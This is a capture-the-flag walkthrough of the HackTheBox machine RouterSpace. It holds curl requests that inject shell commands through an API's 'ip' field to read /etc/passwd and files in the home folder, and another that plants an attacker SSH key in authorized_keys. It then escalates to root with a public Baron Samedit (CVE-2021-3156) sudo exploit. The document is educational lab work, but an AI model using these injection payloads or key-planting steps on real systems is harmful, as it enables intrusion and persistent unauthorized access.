---
title: "Walk-through of RouterSpace from HackTheBox"
header:
  teaser: /assets/images/2022-04-13-22-01-52.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Anbox
  - adb
  - apk
  - CVE-2021-3156
  - Baron Samedit
---

[RouterSpace](https://www.hackthebox.com/home/machines/profile/444) is an easy level machine by [h4rithd](https://www.hackthebox.com/home/users/profile/550483) on [HackTheBox](https://www.hackthebox.com/home). This Linux box focuses on web app and OS enumeration, and using SQLMap to dump data.

## Machine Information

![routerspace](/assets/images/2022-04-13-22-01-52.png)

We start with an apk found on the initial website. We use Anbox on Kali to emulate an Android device so we can interact with the apk when it's running. Burp helps us find an address and a proxy let's us interact with the app. We find a way to get remote code execution, which let's us get ssh access to the box and then we use the Baron Samedit (CVE2021-3156) exploit to get root.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - RouterSpace](https://www.hackthebox.com/home/machines/profile/444) |
| Machine Release Date | 26th February 2022 |
| Date I Completed It | 10th April 2022 |
| Distribution Used | Kali 2022.1 – [Release Info](https://www.kali.org/blog/kali-linux-2022-1-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.148 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root㉿kali)-[~/htb/routerspace]
└─# nmap -p$ports -sC -sV -oA routerspace 10.10.11.148
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 17:03 EDT
Nmap scan report for 10.10.11.148
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
80/tcp open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-58343
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 70
|     ETag: W/"46-Qhj36TEqDHhoIimlameRlpAHdCU"
|     Date: Wed, 13 Apr 2022 21:03:50 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: LM w5v T Tcfci8 isw }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-3904
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Wed, 13 Apr 2022 21:03:49 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-53633
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Wed, 13 Apr 2022 21:03:49 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: RouterSpace
|_http-trane-info: Problem with XML parsing of /evox/about
<SNIP>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.20 seconds
```

We find just two ports open, 22 (SSH) is probably for later, so for now it's just port 80. Let's have a look:

![routerspace-website](/assets/images/2022-04-13-22-11-06.png)

## APK File

It's a static website with nothing to do. Just a link to download an apk, let's grab it:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# wget http://10.10.11.148/RouterSpace.apk
--2022-04-13 17:14:19--  http://10.10.11.148/RouterSpace.apk
Connecting to 10.10.11.148:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 35855082 (34M) [application/vnd.android.package-archive]
Saving to: ‘RouterSpace.apk’
RouterSpace.apk          100%[=========================>]  34.19M  1.78MB/s    in 22s     

2022-04-13 17:14:41 (1.53 MB/s) - ‘RouterSpace.apk’ saved [35855082/35855082]
```

## Anbox Configuration

We have an Android application (apk) file, now we need a way of running it. To do that there's a few options but for simplicity we can use Anbox which is in the Kali repo.

First check lxc is installed and up to date:

```sh
┌──(root㉿kali)-[~]
└─# apt-get install lxc
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  arch-test bridge-utils busybox-static cloud-image-utils debootstrap distro-info fakechroot 
  gcc-12-base genisoimage ibverbs-providers libboost-iostreams1.74.0 libboost-thread1.74.0
<SNIP>
1 upgraded, 35 newly installed, 1 to remove and 826 not upgraded.
Need to get 26.9 MB of archives.
After this operation, 81.1 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://http.kali.org/kali kali-rolling/main amd64 busybox-static amd64 1:1.30.1-7+b2 [896 kB]
Get:2 http://http.kali.org/kali kali-rolling/main amd64 uuid-runtime amd64 2.37.3-1+b1 [104 kB]
Get:3 http://kali.download/kali kali-rolling/main amd64 gcc-12-base amd64 12-20220319-1 [206 kB]
Get:4 http://http.kali.org/kali kali-rolling/main amd64 libstdc++6 amd64 12-20220319-1 [617 kB]
<SNIP>
Fetched 26.9 MB in 5s (5,944 kB/s)
Extracting templates from packages: 100%
Preconfiguring packages ...
dpkg: busybox: dependency problems, but removing anyway as you requested:
 cryptsetup-initramfs depends on busybox | busybox-static; however:
  Package busybox is to be removed.
  Package busybox-static is not installed.
<SNIP>
Unpacking lxc-templates (3.0.4-5) ...
Selecting previously unselected package lxcfs.
Preparing to unpack .../28-lxcfs_5.0.0-1_amd64.deb ...
Unpacking lxcfs (5.0.0-1) ...
Done.
<SNIP>
Setting up qemu-utils (1:6.2+dfsg-2) ...
Setting up arch-test (0.18-1) ...
Setting up libgfxdr0:amd64 (10.1-1+b1) ...
update-initramfs: Generating /boot/initrd.img-5.15.0-kali3-amd64
Processing triggers for libc-bin (2.33-1) ...
Processing triggers for man-db (2.9.4-4) ...
Processing triggers for kali-menu (2021.4.2) ...
```

It's a long install so i've cut most of it out. With lxc sorted let's install anbox:

```sh
┌──(root㉿kali)-[~]
└─# apt-get install anbox
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libboost-filesystem1.74.0 libboost-log1.74.0 libboost-program-options1.74.0 libboost-regex1.74.0 libgles2 libprotobuf-lite23 libsdbus-c++1 libsdl2-image-2.0-0 libwebp7
The following NEW packages will be installed:
  anbox libboost-filesystem1.74.0 libboost-log1.74.0 libboost-program-options1.74.0 libboost-regex1.74.0 libgles2 libprotobuf-lite23 libsdbus-c++1 libsdl2-image-2.0-0 libwebp7
0 upgraded, 10 newly installed, 0 to remove and 826 not upgraded.
Need to get 3,183 kB of archives.
After this operation, 16.2 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://kali.download/kali kali-rolling/main amd64 libgles2 amd64 1.4.0-1 [18.2 kB]
<SNIP>
Get:10 http://http.kali.org/kali kali-rolling/contrib amd64 anbox amd64 0.0~git20211020-2 [754 kB]
Fetched 3,183 kB in 1s (2,149 kB/s)
<SNIP>
Setting up anbox (0.0~git20211020-2) ...
Created symlink /etc/systemd/user/default.target.wants/anbox-session-manager.service → /usr/lib/systemd/user/anbox-session-manager.service.
Processing triggers for kali-menu (2021.4.2) ...
Processing triggers for desktop-file-utils (0.26-1) ...
Processing triggers for libc-bin (2.33-1) ...
Processing triggers for man-db (2.9.4-4) ...
Processing triggers for mailcap (3.70+nmu1) ...
```

Now we need to download an Android image:

```sh
┌──(root㉿kali)-[~]
└─# wget https://build.anbox.io/android-images/2018/07/19/android_amd64.img
--2022-04-12 17:38:09--  https://build.anbox.io/android-images/2018/07/19/android_amd64.img
Resolving build.anbox.io (build.anbox.io)... 163.172.154.175
Connecting to build.anbox.io (build.anbox.io)|163.172.154.175|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 325902336 (311M)
Saving to: ‘android_amd64.img’
android_amd64.img     100%[==================================>] 310.80M  25.3MB/s    in 20s     
2022-04-12 17:38:29 (15.5 MB/s) - ‘android_amd64.img’ saved [325902336/325902336]
```

This needs moving to the anbox folder:

```sh
┌──(root㉿kali)-[~]
└─# mv android_amd64.img /var/lib/anbox/android.img
```

Finally we need to start the anbox container service:

```sh
┌──(root㉿kali)-[~]
└─# systemctl start anbox-container-manager.service
```

Switch to the desktop and you'll find Anbox in the Application menu. Click it to open the application manager:

![routerspace-anbox](/assets/images/2022-04-13-22-29-50.png)

## Install APK

With that running we can now install our apk file:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# adb install RouterSpace.apk
Command 'adb' not found, but can be installed with:
apt install adb
Do you want to install it? (N/y)y
apt install adb
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  android-sdk-platform-tools-common
The following NEW packages will be installed:
  adb android-sdk-platform-tools-common
0 upgraded, 2 newly installed, 0 to remove and 826 not upgraded.
Need to get 608 kB of archives.
After this operation, 1,835 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://kali.download/kali kali-rolling/main amd64 adb amd64 1:29.0.6-6 [599 kB]
Get:2 http://http.kali.org/kali kali-rolling/main amd64 android-sdk-platform-tools-common all 28.0.2+7 [8,276 B]
Fetched 608 kB in 1s (968 kB/s)                         
Selecting previously unselected package adb.
(Reading database ... 290024 files and directories currently installed.)
Preparing to unpack .../adb_1%3a29.0.6-6_amd64.deb ...
Unpacking adb (1:29.0.6-6) ...
Selecting previously unselected package android-sdk-platform-tools-common.
Preparing to unpack .../android-sdk-platform-tools-common_28.0.2+7_all.deb ...
Unpacking android-sdk-platform-tools-common (28.0.2+7) ...
Setting up android-sdk-platform-tools-common (28.0.2+7) ...
Setting up adb (1:29.0.6-6) ...
Processing triggers for man-db (2.9.4-4) ...
Processing triggers for kali-menu (2021.4.2) ...
```

Adb and the other tools needed installing. Now they're there we can try again:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# adb install RouterSpace.apk
* daemon not running; starting now at tcp:5037
* daemon started successfully
error: device offline
Performing Push Install
adb: error: failed to get feature set: device offline
```

The first time we get an error because the daemon isn't running. It starts automatically, so just run the command again:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# adb install RouterSpace.apk
Performing Streamed Install
Success
```

## Run Application

This time it works and looking back at Anbox we see our app has appeared:

![routerspace-installed](/assets/images/2022-04-13-22-33-34.png)

Running the app we get to this page:

![routerspace-check-status](/assets/images/2022-04-13-22-46-20.png)

Clicking the Check Status button gives us an error:

![routerspace-error](/assets/images/2022-04-13-22-49-13.png)

## ADB Proxy Config

We can't see where the app is trying to get to, and there's no way to set a proxy on Anbox, but a quick search found [this](https://poetengineer.postach.io/post/toggle-charles-proxy-on-android-from-command-line) which shows us how to do it from the command line with adb. To enable we just do this:

```text
adb shell settings put global http_proxy <host>:<port>
```

If we set the add http_proxy to point to Burp then we can capture traffic coming from the RouterSpace app:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# adb shell settings put global http_proxy 10.10.14.124:4444
```

## Burp Intercept

Now start Burp and go to the Options tab of the Proxy sections:

![routerspace-burp-proxy](/assets/images/2022-04-17-13-57-47.png)

Add a new Proxy Listener and bind it to our tun0 address with the same port as we set above for the adb http_proxy:

![routerspace-set-new-proxy](/assets/images/2022-04-17-13-58-32.png)

It should look like this when added:

![routerspace-burp-proxy-set](/assets/images/2022-04-17-13-59-17.png)

Go back to the RouterSpace app and click Check Status again, now back to Burp to see it intercepted the request:

![routerspace-intercepted](/assets/images/2022-04-17-14-00-03.png)

We can send to repeater to play with it:

![routerspace-repeater](/assets/images/2022-04-17-14-00-59.png)

## Using Curl for RCE

With the endpoint found we now don't need Anbox and can continue to explore without it. I prefer to use the command line so we can use curl instead of Burp:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# curl -s -H 'user-agent: RouterSpaceAgent' -H 'Content-Type: application/json' --data-binary $'{\"ip\":\"0.0.0.0\"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess

"0.0.0.0\n"
```

After playing around I found we can use a ; after the 0.0.0.0 to run a command of our choosing. Here I'm displaying the passwd file, and using sed/cut to make it display nicely:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# curl -s -H 'user-agent: RouterSpaceAgent' -H 'Content-Type: application/json' --data-binary $'{\"ip\":\"0.0.0.0;cat /etc/passwd\"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess > /dev/null | sed 's/\\n/\n/g' | cut -d '"' -f 2 | sed -n '1!p' | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
paul:x:1001:1001:,,,:/home/paul:/bin/bash
```

Just Paul and root can login. Let's look in Paul's home folder:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# curl -s -H 'user-agent: RouterSpaceAgent' -H 'Content-Type: application/json' --data-binary $'{\"ip\":\"0.0.0.0;ls -lsa /home/paul\"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess > /dev/null | sed 's/\\n/\n/g' | cut -d '"' -f 2 | sed -n '1!p'                 
total 48
4 drwxr-xr-x 8 paul paul 4096 Feb 17 18:30 .
4 drwxr-xr-x 3 root root 4096 Feb 17 18:30 ..
0 lrwxrwxrwx 1 root root    9 Nov 20 19:32 .bash_history -> /dev/null
4 -rw-r--r-- 1 paul paul  220 Nov 20 17:32 .bash_logout
4 -rw-r--r-- 1 paul paul 3771 Nov 20 17:32 .bashrc
4 drwx------ 2 paul paul 4096 Feb 17 18:30 .cache
4 drwx------ 3 paul paul 4096 Apr 19 20:01 .gnupg
4 drwxrwxr-x 3 paul paul 4096 Feb 17 18:30 .local
4 drwxrwxr-x 5 paul paul 4096 Apr 19 17:24 .pm2
4 -rw-r--r-- 1 paul paul  823 Nov 20 18:30 .profile
4 drwxr-xr-x 3 paul paul 4096 Feb 17 18:30 snap
4 drwx------ 2 paul paul 4096 Apr 19 19:46 .ssh
4 -r--r----- 1 root paul   33 Apr 19 17:25 user.txt
```

## User Flag

We can grab the user flag:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# curl -s -H 'user-agent: RouterSpaceAgent' -H 'Content-Type: application/json' --data-binary $'{\"ip\":\"0.0.0.0;cat /home/paul/user.txt\"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess > /dev/null | sed 's/\\n/\n/g' | cut -d '"' -f 2 | sed -n '1!p' 
1883f666c7b2ac1683e666225a372ce7
```

## Reverse Shell

Time for a reverse shell. We can do the same as we did on [Horizontall](https://pencer.io/ctf/ctf-htb-horizontall/). First generate an ssh key pair:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# ssh-keygen                                      
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/htb/routerspace/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/htb/routerspace/id_rsa
Your public key has been saved in /root/htb/routerspace/id_rsa.pub
The key fingerprint is:
SHA256:Z+wQ9wrHt+p7f6aOv/tAol77FCQ36P28umPKNnhPu24 root@kali
The keys randomart image is:
+---[RSA 3072]----+
|                 |
|             .   |
|        . . o +  |
|         = o = . |
|        S * = +  |
|         B + + + |
|          = o.o o|
|         o.*oE..+|
|         .B=X%&O.|
+----[SHA256]-----+
```

Now we can echo that in to an authorized_keys file on the box:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# curl -s -H 'user-agent: RouterSpaceAgent' -H 'Content-Type: application/json' --data-binary $'{\"ip\":\"0.0.0.0;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4jyNVMJ963UsvyDfhRCXbXMcVS4Psrhcm1Yf9VlDlip5DiuiMuZc/ODFLLGrEpq8xyVTVX1/nXD7yjXRl60bfnwvD3qUHPjlNCj25eSVe0Nf2uWnfaW3DNDJ4ZX0NRbwfsVxGCM15DnKC6Qx85S5I+S15M3pzh4+wf5o59ebRWrHVgWAUTkJ2ktM+zb/5m18Sjpafe/JC6TKOEGZcwjeE0l3+jsVBxukjj6mhmgEaO2hFE83HwqyhLmhPYvcVEP3wF8ln5yNTBUhHaReY8UV5hPESHsw1jTPfgFvLt2/J0bX35bpt9qbKpVxKv58t7+phG/OSy7i7MLZSLjToFvxCiBBCnY0kUo1Qn1E10TdeAhYx6Q/wf/re5SbiPWg2UWQYeUayGA8SgoYaal+SaX9Yn9ukOiSVkjEMlwI1ULrrcIPNbIRxfj8iL2xYqU6BLspFqrO5PKabeIWBmJlWqKs1esCJQQ6RX8im5kEr/LW61fIvSjkUvDcb0IaC0Z8Y/ms= root@kali' > /home/paul/.ssh/authorized_keys\"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
```

Change permissions on our private key on Kali:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# chmod 600 id_rsa
```

Now we can log in as Paul:

```sh
┌──(root㉿kali)-[~/htb/routerspace]
└─# ssh -i id_rsa paul@routerspace.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

  System information as of Tue 19 Apr 2022 09:00:51 PM UTC

  System load:  0.0               Processes:             206
  Usage of /:   71.0% of 3.49GB   Users logged in:       1
  Memory usage: 31%               IPv4 address for eth0: 10.10.11.148
  Swap usage:   0%

Last login: Tue Apr 19 20:59:32 2022 from 10.10.14.124
paul@routerspace:~$ 
```

## CVE-2021-3156

Escalation to root is nice and simple on this box. If you copy [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) across it's output will show you this box has a version of sudo that is vulnerable to CVE-2021-3156. Also known as Baron Samedit, some info [here](https://info.dovermicrosystems.com/blog/what-is-baron-samedit) if you're interested.

We can check the version installed:

```sh
paul@routerspace:~$ sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

That version is indeed vulnerable. I looked on GitHub and found [this](https://github.com/worawit/CVE-2021-3156) exploit. I just copy/pasted it in to a file on the box:

```sh
paul@routerspace:~$ cat exploit.py 
#!/usr/bin/python3
Exploit for CVE-2021-3156 with overwrite struct service_user by sleepya

This exploit requires:
- glibc with tcache
- nscd service is not running

Tested on:
- Ubuntu 18.04
```

## Root Flag

Then ran it to get root and the flag:

```sh
paul@routerspace:~$ python3 exploit.py
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)

# cat /root/root.txt
c97714e03098f4ef64378114f235078a
```

It took me a long time to get Anbox working for some reason, but after that the box was pretty simple.

Hopefully you learned something, see you next time.
